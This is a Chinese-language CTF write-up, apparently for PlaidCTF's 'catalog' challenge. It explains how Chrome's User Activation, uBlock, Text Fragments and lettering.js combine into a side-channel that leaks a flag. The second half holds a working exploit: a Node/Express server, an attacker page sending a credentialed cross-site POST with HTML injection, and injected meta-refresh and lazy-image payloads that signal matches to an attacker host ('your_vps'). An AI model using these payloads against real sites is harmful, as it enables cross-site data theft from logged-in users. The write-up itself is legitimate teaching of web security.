+<p>User Activation(暂且称为用户激活状态)</p>
+</li>
+<li>
+<p>uBlock</p>
+</li>
+<li>
+<p>Text Fragments</p>
+</li>
+<li>
+<p>lattering</p>
+</li>
+</ul>
+<p>上述特性和概念主要和chrome浏览器的相关特性有关，下面我们详细介绍</p>
+<h3 data-content="1" id="910bf1f57aaefee130c87ddb67e4ea13">User Activation</h3>
+<p>对于这部分的知识，可以参考<a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank">User Activation v2</a>、<a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank">User Activation v2 (UAv2)</a></p>
+<p>对于这一概念，搜一下可以得到解释</p>
+<blockquote>
+<p>User activation is the mechanism to maintain active-user-interaction state that limits use of “abusable” APIs (e.g. opening popups or vibrating).</p>
+</blockquote>
+<p>简单来说，User Activation主要作用是保持与用户的交互状态，防止加载恶意的API，比如弹窗或者振动等。用户与浏览器的交互状态移位着某种行为的输入，可以简单理解为"点击"、"打字"等或者页面加载完毕后的某些交互(滚动条等)。恶意的API通常会通过<code>window.open()</code>等方式来在用户的浏览器中进行一些恶意的操作，比如任意弹窗等。而User Activation便可发挥作用，其在用户为与浏览器交互，即未激活User  Activation时，会阻止恶意API的功能。在chrome中，有30多种API受到用户激活状态的控制，如全屏，自动播放，<strong>还有我们下面要说的Text Fragments</strong></p>
+<h3 data-content="1" id="0260d822b535f5391ed9625ce26d4443">uBlock</h3>
+<p>这个uBlock目前看来是配合User Activation来保持用户激活状态的。又是一段英文的解释</p>
+<blockquote>
+<p>uBlock Origin (or uBlock) is not an <em>ad blocker</em>; it’s a general-purpose blocker. uBlock Origin blocks ads through its support of the <a href="https://adblockplus.org/en/filters" target="_blank">Adblock Plus filter syntax</a>. uBlock Origin <a href="https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions" target="_blank">extends</a> the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in <a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-deny" target="_blank">default-deny mode</a>, which mode will cause <a href="https://requestpolicycontinued.github.io/#what-are-cross-site-requests" target="_blank">all 3rd-party network requests</a> to be blocked by default, unless allowed by the user.</p>
+</blockquote>
+<p>简单来说，就是uBlock并非只是一个广告的blocker(过滤广告)，其实际上可以通过自定义规则来过滤页面元素，是一个通用的blocker。除此之外，我们看到该题作者在hint中的解释</p>
+<blockquote>
+<p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, <strong>uBlock sends a postMessage to its extension iframe, which duplicates the user activation</strong>. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and <strong>thus duplicates the activation back again.</strong></p>
+</blockquote>
+<p>我们暂且不深究uBlock代码层面的实现方式，就从hint来说的话uBlock能帮助我们多次激活用户激活状态，有利于我们接下来要说的一系列操作。</p>
+<h3 data-content="1" id="96fcd2c923d520eebd2654c078f111aa">Text Fragments</h3>
+<p>这个是Chrome的特性：<a href="https://developers.google.com/web/updates/2020/02/nic80#more" target="_blank">New in Chrome 80</a></p>
+<p>在题目介绍中知道，要获取flag，我们必须通过某种侧信道的方式来匹配到flag，并且根据flag的格式<code>/^PCTF\{[A-Z0-9_]+\}$/</code>，我们假设flag为<code>PCTF{FLAG}</code>，Text Fragments的特性为匹配flag提供了帮助</p>
+<p>该特性能使用<code>#:~:text=something</code>这样的语法来使得页面滑动到<code>something</code>的位置并高亮匹配的字符串，有点类似<code>ctrl+f</code>的功能或者锚的作用。这里介绍一下该特性的用法和坑点，具体参考： <a href="https://wicg.github.io/ScrollToTextFragment/" target="_blank">Text Fragments</a></p>
+<ul>
+<li>语法：</li>
+</ul>
+<pre><code>#:~:text=[prefix-,]textStart[,textEnd][,-suffix][&amp;text=...]
+          context  |-------match-----|  context</code></pre>
+<p>根据上面的图示，前缀和后缀并非匹配到的文本，只是用于限制上下文，中间的<code>textStart</code>和<code>textEnd</code>才是真正用于匹配文本的部分</p>
+<ul>
+<li>只能匹配一个完整单词或多个单词，不能匹配单词中的部分</li>
+</ul>
+<p>比如在文档里给出的例子，要想匹配range，只能匹配到<code>mountain range</code>中的，而不能匹配到<code>color orange</code>中的</p>
+<ul>
+<li>只能匹配在同一块(同一标签)中的单词</li>
+</ul>
+<blockquote>
+<pre><code>:~:text=The quick</code></pre>
+<p>not match:</p>
+<pre><code>&lt;div&gt;The&lt;div&gt; &lt;/div&gt;quick brown fox&lt;/div&gt;</code></pre>
+<p>match:</p>
+<pre><code>&lt;div&gt;The quick brown fox&lt;/div&gt;</code></pre>
+</blockquote>
+<p>假设我们用<code>#:~:text=P-,C,T,-F</code>去flag是不成功的，因为无法匹配单个字符，所以我们要想办法把同一块中的字符串拆分为多个字符，每个字符占一块。这就涉及下面的lettering方法</p>
+<p>除此之外，我们还需要考虑一个问题，前面的User Activation和uBlock到底有什么作用？</p>
+<p>对应Text Fragments的机制，chrome对其作出了一些限制和解释：</p>
+<blockquote>
+<p>The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack<strong>. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</strong></p>
+</blockquote>
+<p>上面这段话的意思就是说：利用Text Fragments，攻击者可能会任意leak出页面内容，所以要严格的通过User Activation来控制这一机制。还由一句补充的解释</p>
+<blockquote>
+<p><strong>In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation.</strong></p>
+</blockquote>
+<p>这里结合hint1可以了解到出题人的意图大致是：让我们利用管理员点击一个我们提交的URL链接，此时会激活User Activation，而通过uBlock我们可以保持User Activation，这样才能使用Text Fragments来leak出flag。(这里只是结合文档资料的理解，并没有从代码层面深究)。</p>
+<blockquote>
+<p>注：首先User Activation是必须存在的，否则Text Fragments不能使用，但对于uBlock存在的意义，可以在本地做题环境中模拟管理员，并在chrome中关闭uBlock扩展来测试原先的exp是否还能复现成功，若不成功，可说明的确需要uBlock配合。</p>
+</blockquote>
+<h3 data-content="1" id="82d395807f0723442fd898f3e884be2e">lettering</h3>
+<p>在页面中引入了如下js文件</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"</span> <span class="na">nonce</span><span class="o">=</span><span class="s">"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js"</span> <span class="na">nonce</span><span class="o">=</span><span class="s">"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"/js/main.js"</span> <span class="na">nonce</span><span class="o">=</span><span class="s">"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+<p>并且在main.js中发现<code>$("em").lettering();</code></p>
+<p>为什么要提到这段代码呢，这里要说到<code>lettering</code>这个API：<a href="https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering(" target="_blank">Lettering.js wiki - Wrapping letters with lettering()</a>)</p>
+<p>假设有如下代码：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">"fancy_title"</span><span class="p">&gt;</span>Some Title<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</pre></div>
+<p>当我们引入jquery.min.js和jquery.lettering.min.js这两个文件并插入如下代码</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"path/to/jquery.min.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"path/to/jquery.lettering.min.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">$</span><span class="p">(</span><span class="s2">".fancy_title"</span><span class="p">).</span><span class="nx">lettering</span><span class="p">();</span> <span class="c1">//选择fancy_title的内容调用lettering()方法</span>
+<span class="p">});</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+<p>然后会产生如下的结果</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">"fancy_title"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char1"</span><span class="p">&gt;</span>S<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char2"</span><span class="p">&gt;</span>o<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char3"</span><span class="p">&gt;</span>m<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char4"</span><span class="p">&gt;</span>e<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char5"</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char6"</span><span class="p">&gt;</span>T<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char7"</span><span class="p">&gt;</span>i<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char8"</span><span class="p">&gt;</span>t<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char9"</span><span class="p">&gt;</span>l<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">"char10"</span><span class="p">&gt;</span>e<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</pre></div>
+<p>也就是说，对于<code>$("em").lettering()</code>这段代码，题目已经提供了便利，当我们利用html代码注入插入<code>&lt;em&gt;</code>标签时，其内容会拆分为分块字符。这样也就可以配合Text Fragments进行flag的匹配了</p>
+<h2 data-content="1" id="77e8580fd268a434c8909247be419111">匹配技巧</h2>
+<h3 data-content="1" id="a4daf68aecff3b886d9033f8bd1c5564">判断匹配成功</h3>
+<p>有了上面的前置知识，这里还要组合起来利用，对于Text Fragments的匹配，我们如何判断是否选中成功呢？在官方exp中是这样判断：</p>
+<ol>
+<li>
+<p>首先我们知道同一session可以存储一定的html元素，在登录状态下，仍可以利用fetch no-cors来更新界面，从而登录失败在另一个有同一session的页面下进行html代码注入</p>
+</li>
+<li>
+<p>注入足够多的<code>&lt;br&gt;</code>标签，从而使flag位于页面视图之外(需要拉动滚动条)，然后在<code>&lt;br&gt;</code>后利用<code>&lt;img src='xxx' loading=lazy&gt;</code>来加载图片并src请求来判断，并且这个图片是懒加载机制(位于用户浏览器视图内才会加载，否则不加载)</p>
+</li>
+<li>
+<p>由于一开始图片位于视图外，所以图片不加载，如果利用Text Fragments匹配到flag，则由于多个<code>&lt;br&gt;</code>，页面先滚动到flag的位置，这时图片位于视图内，于是加载，设置<code>src = 'http://vps'</code>发送请求，通过自己的vps上是否接收到请求来判断是否匹配到flag</p>
+</li>
+</ol>
+<pre><code>图片未加载 -&gt; 匹配到flag -&gt; 发送请求
+         -&gt; 未匹配flag</code></pre>
+<p>关于图片的懒加载机制：<a href="https://chromestatus.com/feature/5645767347798016" target="_blank">Lazily load iframes and images via ‘loading’ attribute</a></p>
+<blockquote>
+<p>只有当用户窗口页面内关注到<code>&lt;img&gt;</code>标签时，该标签才能加载对应的资源。我们可以使用<code>&lt;img&gt;</code>原生属性<code>loading=lazy</code>来实现，Chrome 76以后的版本都已实现了该功能</p>
+</blockquote>
+<h3 data-content="1" id="a95cac5f797b5da81985af0a5cd9ef6e">二分爆破</h3>
+<p>根据 flag 的格式<code>/^PCTF\{[A-Z0-9_]+\}$/</code>，我们可以构造如下URL(包括所有的可能字符)</p>
+<pre><code>http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}&amp;text=T-,F,{,-0&amp;text=T-,F,{,-1&amp;text=T-,F,{,-2&amp;text=T-,F,{,-3&amp;text=T-,F,{,-4&amp;text=T-,F,{,-5&amp;text=T-,F,{,-6&amp;text=T-,F,{,-7&amp;text=T-,F,{,-8&amp;text=T-,F,{,-9&amp;text=T-,F,{,-A&amp;text=T-,F,{,-B&amp;text=T-,F,{,-D&amp;text=T-,F,{,-E&amp;text=T-,F,{,-F&amp;text=T-,F,{,-G&amp;text=T-,F,{,-H&amp;text=T-,F,{,-I&amp;text=T-,F,{,-J&amp;text=T-,F,{,-K&amp;text=T-,F,{,-L&amp;text=T-,F,{,-M&amp;text=T-,F,{,-N&amp;text=T-,F,{,-O&amp;text=T-,F,{,-P&amp;text=T-,F,{,-Q&amp;text=T-,F,{,-R&amp;text=T-,F,{,-S&amp;text=T-,F,{,-T&amp;text=T-,F,{,-U&amp;text=T-,F,{,-V&amp;text=T-,F,{,-W&amp;text=T-,F,{,-X&amp;text=T-,F,{,-Y&amp;text=T-,F,{,-Z&amp;text=T-,F,{,-_</code></pre>
+<p>我们利用二分加快爆破速度，先将所有text情况分半，假设分成如下：</p>
+<pre><code>http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}&amp;text=T-,F,{,-0&amp;text=T-,F,{,-1&amp;text=T-,F,{,-2&amp;text=T-,F,{,-3&amp;text=T-,F,{,-4&amp;text=T-,F,{,-5&amp;text=T-,F,{,-6&amp;text=T-,F,{,-7&amp;text=T-,F,{,-8&amp;text=T-,F,{,-9&amp;text=T-,F,{,-A&amp;text=T-,F,{,-B&amp;text=T-,F,{,-D&amp;text=T-,F,{,-E&amp;text=T-,F,{,-F&amp;text=T-,F,{,-G&amp;text=T-,F,{,-H</code></pre>
+<p>若匹配成功，则在该部分继续二分，若匹配失败，则用另一个范围二分，直到匹配只剩一个字符便是flag</p>
+<h2 data-content="1" id="285642f3893b4f3f1c3cc159462e2a05">复现 &amp; exp</h2>
+<p>上面已经分析完这道题所需要的技术和知识了，现在只需将上述过程利用exp来实现，其实原理还是好理解，但是exp就有点糊:)</p>
+<p>这里先给出exp:</p>
+<ol>
+<li><strong>exp.js</strong></li>
+</ol>
+<p>在自己的vps上用node运行</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"express"</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+
+<span class="kd">let</span> <span class="nx">status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="kd">let</span> <span class="nx">unlock</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="kd">let</span> <span class="nx">match</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/status"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">status</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/unlock"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">unlock</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"unlock"</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/firstload"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; Admin opened challenge's page"</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"firstload"</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; Admin was redirected to attacker's page"</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="s2">"index.html"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="nx">root</span><span class="o">:</span> <span class="nx">__dirname</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/injection"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; HTML injection was inserted into id=3 catalog"</span><span class="p">);</span>
+    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">match</span><span class="p">)</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; There was a match"</span><span class="p">);</span>
+        <span class="k">else</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; There wasn't a match"</span><span class="p">);</span>
+        <span class="nx">match</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nx">unlock</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nx">status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"injection"</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/exfiltrated"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">match</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"exfiltrated"</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/fragment"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">status</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; Admin was fragmented"</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="nx">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">unlock</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"fragment"</span><span class="p">);</span>
+            <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Server running on port: "</span> <span class="o">+</span> <span class="nx">port</span><span class="p">);</span>
+</pre></div>
+<ol>
+<li><strong>index.html</strong></li>
+</ol>
+<p>根目录存放的index.html文件，当访问<code>http://your_vps/</code>时会加载</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>exp<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+            <span class="kr">const</span> <span class="nx">next</span> <span class="o">=</span> <span class="nx">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+                <span class="kd">let</span> <span class="nx">res</span>  <span class="o">=</span> <span class="nx">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">"/status"</span><span class="p">);</span>
+                <span class="kd">let</span> <span class="nx">status</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">status</span> <span class="o">===</span> <span class="s2">"true"</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">"http://catalog.pwni.ng/user.php"</span><span class="p">,</span> <span class="p">{</span>
+                        <span class="s2">"headers"</span><span class="o">:</span> <span class="p">{</span>
+                            <span class="s2">"content-type"</span><span class="o">:</span> <span class="s2">"application/x-www-form-urlencoded"</span><span class="p">,</span>
+                        <span class="p">},</span>
+                        <span class="s2">"body"</span><span class="o">:</span> <span class="sb">`username="/&gt;&lt;img src="http://your_vps/injection"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align="left"&gt;&lt;img src="http://your_vps/exfiltrated" loading="lazy"&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span><span class="p">,</span>
+                        <span class="s2">"method"</span><span class="o">:</span> <span class="s2">"POST"</span><span class="p">,</span>
+                        <span class="s2">"mode"</span><span class="o">:</span> <span class="s2">"no-cors"</span><span class="p">,</span>
+                        <span class="s2">"credentials"</span><span class="o">:</span> <span class="s2">"include"</span>
+                    <span class="p">});</span>
+                    <span class="nx">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">"/unlock"</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nx">next</span><span class="p">();</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+
+            <span class="nx">next</span><span class="p">();</span>
+        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://catalog.pwni.ng/issue.php?id=issue1"</span> <span class="na">style</span><span class="o">=</span><span class="s">"position: absolute; width: 400%; height: 500px; border: 0"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>然后我们分析一下exp和整个攻击链的工作流程：(前提注册账号等工作已经完成)</p>
+<p>1.<strong>创建issue1，抓包改post内容为</strong></p>
+<div class="highlight"><pre><span></span>id=issue1<span class="err">&amp;</span>title=3<span class="err">&amp;</span>content=1<span class="err">&amp;</span>image=z"/&gt;<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://your_vps/fragment"</span><span class="p">&gt;&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"refresh"</span><span class="err">+</span><span class="na">content</span><span class="o">=</span><span class="s">"0;URL='http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I%26text=T-,F,{,-J%26text=T-,F,{,-K%26text=T-,F,{,-L%26text=T-,F,{,-M%26text=T-,F,{,-N%26text=T-,F,{,-O%26text=T-,F,{,-P%26text=T-,F,{,-Q%26text=T-,F,{,-R%26text=T-,F,{,-S%26text=T-,F,{,-T%26text=T-,F,{,-U%26text=T-,F,{,-V%26text=T-,F,{,-W%26text=T-,F,{,-X%26text=T-,F,{,-Y%26text=T-,F,{,-Z%26text=T-,F,{,-_'"</span><span class="p">&gt;</span>
+</pre></div>
+<p>这里利用的是img url处的注入，注入的内容利用meta跳转、Text  Fragments来发送请求爆破flag</p>
+<blockquote>
+<p><strong>flag所在页面是<code>http://catalog.pwni.ng/issue.php?id=3</code></strong></p>
+</blockquote>
+<p>2.<strong>创建issue2，抓包改内容为</strong></p>
+<div class="highlight"><pre><span></span>id=issue_id_2<span class="err">&amp;</span>title=3<span class="err">&amp;</span>content=1<span class="err">&amp;</span>image="&gt;<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"refresh"</span> <span class="na">content</span><span class="o">=</span><span class="s">"0;URL='http://your_vps/'"</span><span class="p">&gt;</span>"
+</pre></div>
+<p>issue2是攻击链的起点，提交给admin bot访问</p>
+<p>3.vps上起服务：<code>node exp.js</code></p>
+<p>4.提交issue2所在页面(<code>http://catalog.pwni.ng/issue.php?id=3</code>)给admin访问，由于存在meta跳转，会跳转到vps上的index.html</p>
